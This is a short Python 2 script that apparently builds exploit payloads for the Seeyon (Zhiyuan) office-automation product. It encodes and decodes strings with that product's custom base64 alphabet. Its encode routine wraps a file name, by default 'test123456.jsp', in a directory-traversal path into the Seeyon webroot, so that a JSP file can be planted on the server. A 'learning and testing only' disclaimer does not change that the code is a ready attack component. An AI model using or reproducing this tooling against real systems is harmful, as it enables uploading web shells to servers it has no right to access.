#!/usr/bin/env python2
# -*- coding:utf8 -*-
# author: pcat@chamd5.org
# 仅供学习测试使用，请勿他用。

from string import *
from base64 import *
from sys import *

b64_table='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='
oa_table='gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6'


def pEncode(s):
    print(translate(b64encode(s),maketrans(b64_table,oa_table)))
    s='..\..\..\ApacheJetspeed\webapps\seeyon\{0}'.format(s)
    print(translate(b64encode(s),maketrans(b64_table,oa_table)))
    pass

def pDecode(s):
    print(b64decode(translate(s,maketrans(oa_table,b64_table))))
    pass

if __name__ == '__main__':
    if len(argv) == 3:
        select = argv[1].strip()
        if select == 'e':
            pEncode(argv[2].strip())
        elif select == 'd':
            pDecode(argv[2].strip())
        else:
            print('[!] python ZYOA.py e/d XXX')
    else:
        pEncode('test123456.jsp')
